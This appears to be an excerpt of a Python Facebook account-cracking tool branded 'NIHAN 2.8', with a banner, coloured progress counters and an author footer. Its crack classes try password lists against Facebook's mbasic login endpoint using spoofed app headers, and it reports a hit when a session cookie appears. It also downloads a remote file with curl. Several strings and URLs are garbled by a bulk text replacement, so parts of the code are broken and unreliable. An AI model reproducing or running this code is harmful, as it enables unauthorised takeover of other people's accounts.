...
r1=requests.get("https://github.com/AyeshaNIHAN /File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	...
	os.system('curl -L https://github.com/MARKSINGH1/NIHAN .py.git/files/main/.agents.txt > .agents.txt')
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quNIHAN ty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
...
def main():
	...
	print("\033[1;92m\t│\033[1;92mWELLCOME TO NIHAN  2.8     \033[1;92m      │")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mNIHAN \033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vNIHAN date-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)

			if 'c_user' in ses.cookies.get_dict():

				print('\r\033[1;37m[\033[1;32mNIHAN -OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36mNIHAN  PROCESS HAS BEEN STARTED')
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mNIHAN \033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
...
_______      _____          __    __  ______  __    __   ______   __    __ 
...
=================================================
    ...
    [-] AUTHOR    :\033[1;32m NIHAN 

    [-] GITHUB    :\033[1;32m Picci Nihan

    [-] WhatsApp  :\033[1;32m 01981002555
